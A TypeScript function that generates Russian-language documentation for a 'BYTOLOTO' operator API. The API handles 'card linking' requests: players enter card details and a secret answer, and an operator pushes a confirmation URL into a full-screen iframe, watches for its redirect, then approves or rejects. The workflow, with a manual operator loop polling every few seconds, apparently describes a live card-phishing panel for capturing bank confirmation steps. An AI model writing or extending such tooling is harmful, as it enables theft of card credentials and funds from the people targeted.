export function buildApiDocs({ baseUrl, apiKey }: { baseUrl: string; apiKey: string }) {
  const api = `${baseUrl}/api/v1`
  return `# BYTOLOTO — Operator API

Сгенерировано: ${new Date().toISOString()}

## Доступ

Базовый адрес: \`${api}\`

API-ключ:

\`\`\`
${apiKey}
\`\`\`

Каждый запрос должен содержать заголовок:

\`\`\`
Authorization: Bearer ${apiKey}
\`\`\`

Без ключа или с неверным ключом сервер отвечает \`401 Unauthorized\`.
Ключ хранится на сервере в переменной \`OPERATOR_API_KEY\`. Не передавайте этот файл третьим лицам.

## Как проходит заявка на привязку карты

1. Игрок вводит данные карты и нажимает «Сохранить». Создаётся заявка с уникальным номером вида \`BL-7K2M9Q\`, статус \`pending\`.
2. Игрок отвечает на контрольный вопрос — ответ появляется в поле \`secretAnswer\`.
3. Оператор отправляет ссылку (\`action: "redirect"\`). Страница открывается у игрока на сайте во встроенном окне (iframe) на весь экран.
   - Когда страница загрузилась, \`frameStatus\` становится \`"opened"\`.
   - Как только внутри окна происходит переход на другой адрес (редирект), окно закрывается, \`frameStatus\` становится \`"finished"\`, заполняется \`frameFinishedAt\`. Игрок видит «Проверяем результат».
4. Оператор выносит решение: \`approve\` (успех) или \`reject\` (отклонено) с необязательной причиной \`reason\`. Игрок сразу видит результат и причину.

Важно: целевая страница должна разрешать открытие во фрейме (без \`X-Frame-Options: DENY\` и без запрета \`frame-ancestors\`).
Переходы внутри одностраничных приложений без перезагрузки страницы не считаются редиректом.

## Статусы заявки

| status | Значение |
|---|---|
| \`pending\` | Заявка создана, ждёт ответа на вопрос / ссылки / решения |
| \`code_requested\` | У игрока запрошен код подтверждения |
| \`extra_check\` | Дополнительная проверка |
| \`confirmed\` | Карта подтверждена (успех) |
| \`rejected\` | Привязка отклонена |

Заявки в статусах \`confirmed\` и \`rejected\` закрыты, изменить их нельзя (ответ \`409\`).

## Объект заявки

\`\`\`json
{
  "requestNo": "BL-7K2M9Q",
  "status": "pending",
  "brand": "visa",
  "bankName": "Priorbank",
  "last4": "4242",
  "cardholder": "IVAN IVANOV",
  "secretAnswer": "ответ игрока на контрольный вопрос",
  "redirectUrl": "https://example.com/confirm",
  "frameStatus": "finished",
  "frameFinishedAt": "2026-05-10T12:00:05.000Z",
  "resultReason": null,
  "createdAt": "2026-05-10T11:59:00.000Z",
  "processedAt": null
}
\`\`\`

- \`frameStatus\`: \`null\` — окно ещё не открывалось, \`"opened"\` — страница загружена, \`"finished"\` — на странице произошёл редирект и окно закрыто.
- \`resultReason\`: причина, переданная вместе с решением.

## Методы

### Список заявок

\`GET /card-requests?status=pending&limit=50\`

- \`status\` — необязательный фильтр по статусу.
- \`limit\` — от 1 до 200, по умолчанию 50. Сортировка — новые сверху.

\`\`\`bash
curl -s "${api}/card-requests?status=pending" \\
  -H "Authorization: Bearer ${apiKey}"
\`\`\`

Ответ: \`{ "requests": [ ...объекты заявок ] }\`

### Одна заявка

\`GET /card-requests/{requestNo}\`

\`\`\`bash
curl -s "${api}/card-requests/BL-7K2M9Q" \\
  -H "Authorization: Bearer ${apiKey}"
\`\`\`

Ответ: \`{ "request": { ... } }\`, либо \`404\`.

### Открыть страницу у игрока

\`POST /card-requests/{requestNo}\`

\`\`\`bash
curl -s -X POST "${api}/card-requests/BL-7K2M9Q" \\
  -H "Authorization: Bearer ${apiKey}" \\
  -H "Content-Type: application/json" \\
  -d '{"action":"redirect","url":"https://example.com/confirm"}'
\`\`\`

Ссылка должна начинаться с \`https://\`. Повторная отправка новой ссылки сбрасывает \`frameStatus\` и открывает новую страницу.

### Успех

\`\`\`bash
curl -s -X POST "${api}/card-requests/BL-7K2M9Q" \\
  -H "Authorization: Bearer ${apiKey}" \\
  -H "Content-Type: application/json" \\
  -d '{"action":"approve"}'
\`\`\`

### Отклонить с причиной

\`\`\`bash
curl -s -X POST "${api}/card-requests/BL-7K2M9Q" \\
  -H "Authorization: Bearer ${apiKey}" \\
  -H "Content-Type: application/json" \\
  -d '{"action":"reject","reason":"Недостаточно средств на карте"}'
\`\`\`

\`reason\` — необязательная строка до 500 символов, её видит игрок.

Ответ на любой \`POST\`: \`{ "ok": true, "request": { ... } }\`.

## Коды ответов

| Код | Значение |
|---|---|
| 200 | Успех |
| 400 | Неверный JSON, действие, ссылка или статус |
| 401 | Нет или неверный API-ключ |
| 404 | Заявка не найдена |
| 409 | Заявка уже закрыта |
| 503 | API не настроен на сервере (нет OPERATOR_API_KEY) |

## Рекомендуемый цикл оператора

1. Раз в 2–3 секунды запрашивать \`GET /card-requests?status=pending\`.
2. Когда у заявки появился \`secretAnswer\` — отправить \`redirect\` со ссылкой.
3. Ждать \`frameStatus: "finished"\`, затем отправить \`approve\` или \`reject\` с \`reason\`.
`
}
